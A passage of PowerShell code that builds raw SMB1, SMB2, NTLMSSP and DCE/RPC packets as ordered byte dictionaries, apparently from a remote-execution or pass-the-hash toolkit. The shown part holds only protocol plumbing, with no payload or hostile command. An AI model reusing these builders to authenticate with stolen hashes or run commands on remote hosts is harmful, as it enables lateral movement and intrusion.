            $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function New-PacketSMBSessionSetupAndXRequest
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function New-PacketSMBTreeConnectAndXRequest
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function New-PacketSMBNTCreateAndXRequest
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function New-PacketSMBReadAndXRequest
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function New-PacketSMBWriteAndXRequest
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function New-PacketSMBCloseRequest
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function New-PacketSMBTreeDisconnectRequest
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function New-PacketSMBLogoffAndXRequest
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function New-PacketSMB2Header
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("Command",$packet_command)
        $packet_SMB2Header.Add("CreditRequest",$packet_credit_request)
        $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("ProcessID",$packet_process_ID)
        $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function New-PacketSMB2Echo
    {
        $packet_SMB2EchoRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2EchoRequest.Add("StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2EchoRequest.Add("Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2EchoRequest
    }

    function New-PacketSMB2NegotiateProtocolRequest
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function New-PacketSMB2SessionSetupRequest
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function New-PacketSMB2TreeConnectRequest
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function New-PacketSMB2CreateRequestFile
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function New-PacketSMB2ReadRequest
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function New-PacketSMB2WriteRequest
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function New-PacketSMB2CloseRequest
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function New-PacketSMB2TreeDisconnectRequest
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function New-PacketSMB2SessionLogoffRequest
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function New-PacketNTLMSSPNegotiate
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
        $packet_NTLMSSPNegotiate.Add("InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function New-PacketNTLMSSPAuth
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function New-PacketRPCBind
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("Version",[Byte[]](0x05))
        $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("ContextID",$packet_context_ID)
        $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface",$packet_UUID)
        $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
